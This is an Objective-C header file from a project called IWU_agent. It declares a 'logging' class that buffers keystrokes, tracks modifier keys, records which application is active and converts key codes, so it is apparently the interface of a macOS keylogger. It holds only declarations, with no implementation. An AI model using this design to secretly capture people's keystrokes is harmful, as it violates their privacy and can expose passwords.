//
//  logging.h
//  IWU_agent
//
//  Created by Admin on 17.03.16.
//  Copyright © 2016 Admin. All rights reserved.
//

#import <Foundation/Foundation.h>
@import AppKit;

@interface logging : NSObject {
    NSMutableString *keyLog;
    NSString *lastApp;
    NSUInteger flags;
}

@property NSMutableString *keyLog;
@property NSString *lastApp;

- (void)logModifierKeys:(NSUInteger)newFlags;
- (void)keyPress:(NSEvent*)event;
- (void)appDidActivate:(NSNotification *)notification;
- (NSString*)getAppName:(NSString*)appInfo;
- (void)writeLine;
- (NSString*)keyCodeConversion:(unsigned short)keyCode;

@end
